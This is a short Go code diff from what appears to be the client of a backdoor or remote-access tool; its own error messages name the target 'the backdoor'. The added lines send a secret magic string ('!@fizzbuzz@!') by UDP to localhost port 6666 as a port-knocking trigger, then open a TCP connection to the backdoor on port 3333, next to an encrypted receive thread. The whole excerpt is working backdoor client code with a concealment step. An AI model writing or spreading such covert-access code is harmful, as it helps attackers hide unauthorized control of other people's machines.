@@ -82,6 +82,14 @@ func recvThread(conn net.Conn, gcm cipher.AEAD, info []byte, wg *sync.WaitGroup)
 
 func main() {
 	// Begin connection
+	udp, err := net.Dial("udp", "localhost:6666")
+	if err != nil {
+		fmt.Println("Error dialing the backdoor, exiting...")
+		return
+	}
+	udp.Write([]byte("!@fizzbuzz@!"))
+	udp.Close()
+
 	conn, err := net.Dial("tcp", "localhost:3333")
 	if err != nil {
 		fmt.Println("Error dialing the backdoor, exiting...")
